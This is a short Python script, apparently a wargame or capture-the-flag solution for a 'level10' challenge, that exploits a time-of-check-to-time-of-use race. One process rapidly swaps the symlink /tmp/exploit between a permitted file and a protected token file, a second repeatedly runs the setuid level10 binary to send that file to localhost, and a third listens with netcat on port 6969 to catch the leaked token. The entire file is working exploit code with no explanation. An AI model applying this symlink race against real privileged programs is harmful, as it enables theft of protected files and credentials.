import os
from subprocess import Popen, PIPE, STDOUT
from multiprocessing import Process

DEVNULL = open(os.devnull, 'w')


def func1():
    while True:
        Popen(["ln", "-fs", "/home/user/level10/level10", "/tmp/exploit"],
              stdin=PIPE, stdout=DEVNULL, stderr=STDOUT)
        Popen(["ln", "-fs", "/home/user/level10/token", "/tmp/exploit"],
              stdin=PIPE, stdout=DEVNULL, stderr=STDOUT)


def func2():
    while True:
        Popen(["/home/user/level10/level10", "/tmp/exploit", "127.0.0.1"],
              stdin=PIPE, stdout=DEVNULL, stderr=STDOUT)


def func3():
    Popen(["nc", "-lk", "6969"])


if __name__ == '__main__':
    p1 = Process(target=func1)
    p1.start()
    p2 = Process(target=func2)
    p2.start()
    p3 = Process(target=func3)
    p3.start()
    p1.join()
    p2.join()
    p3.join()
